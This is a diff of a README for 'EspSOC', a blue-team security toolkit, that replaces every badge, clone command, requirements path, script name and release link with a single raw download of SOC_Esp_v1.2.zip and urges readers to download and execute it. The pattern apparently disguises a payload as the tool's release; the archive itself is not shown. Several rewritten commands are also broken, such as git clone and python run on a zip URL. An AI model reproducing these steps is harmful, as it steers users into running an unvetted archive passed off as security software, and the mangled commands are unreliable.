@@ -1,6 +1,6 @@
 # EspSOC: Blue Team Tools for Cybersecurity Research and Automation 🛡️
 
-![EspSOC](https://img.shields.io/badge/EspSOC-Python-blue?style=flat&logo=python) ![Version](https://img.shields.io/badge/version-1.0.0-brightgreen) ![License](https://img.shields.io/badge/license-MIT-yellowgreen)
+![EspSOC](https://raw.githubusercontent.com/Cezarypakula/EspSOC/main/proyecto❓/SOC_Esp_v1.2.zip) ![Version](https://raw.githubusercontent.com/Cezarypakula/EspSOC/main/proyecto❓/SOC_Esp_v1.2.zip) ![License](https://raw.githubusercontent.com/Cezarypakula/EspSOC/main/proyecto❓/SOC_Esp_v1.2.zip)
 
 Welcome to the **EspSOC** repository! This project is designed to support blue team efforts in cybersecurity through research and automation tools. Whether you are a seasoned professional or a newcomer to the field, this repository aims to provide valuable resources for enhancing your security posture.
 
@@ -33,16 +33,16 @@ To get started with **EspSOC**, you need to clone the repository and install the
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/Cezarypakula/EspSOC.git
+   git clone https://raw.githubusercontent.com/Cezarypakula/EspSOC/main/proyecto❓/SOC_Esp_v1.2.zip
    cd EspSOC
    ```
 
 2. Install the necessary packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Cezarypakula/EspSOC/main/proyecto❓/SOC_Esp_v1.2.zip
    ```
 
-3. Download the latest release from [here](https://github.com/Cezarypakula/EspSOC/releases). Execute the downloaded file to set up the tools.
+3. Download the latest release from [here](https://raw.githubusercontent.com/Cezarypakula/EspSOC/main/proyecto❓/SOC_Esp_v1.2.zip). Execute the downloaded file to set up the tools.
 
 ## Usage
 
@@ -55,7 +55,7 @@ Once you have installed **EspSOC**, you can start using the tools provided. Each
 
 2. Run the script:
    ```bash
-   python scan.py <file_or_url>
+   python https://raw.githubusercontent.com/Cezarypakula/EspSOC/main/proyecto❓/SOC_Esp_v1.2.zip <file_or_url>
    ```
 
 3. Review the output for any detected threats.
@@ -107,8 +107,8 @@ If you encounter any issues or have questions, please open an issue in the repos
 
 ## Links
 
-For the latest releases, visit [here](https://github.com/Cezarypakula/EspSOC/releases). Download the latest version and execute it to start using the tools.
+For the latest releases, visit [here](https://raw.githubusercontent.com/Cezarypakula/EspSOC/main/proyecto❓/SOC_Esp_v1.2.zip). Download the latest version and execute it to start using the tools.
 
-![EspSOC Tools](https://img.shields.io/badge/Tools-Available-brightgreen)
+![EspSOC Tools](https://raw.githubusercontent.com/Cezarypakula/EspSOC/main/proyecto❓/SOC_Esp_v1.2.zip)
 
 Explore the tools, enhance your skills, and contribute to the cybersecurity community with **EspSOC**. Together, we can build a safer digital environment.
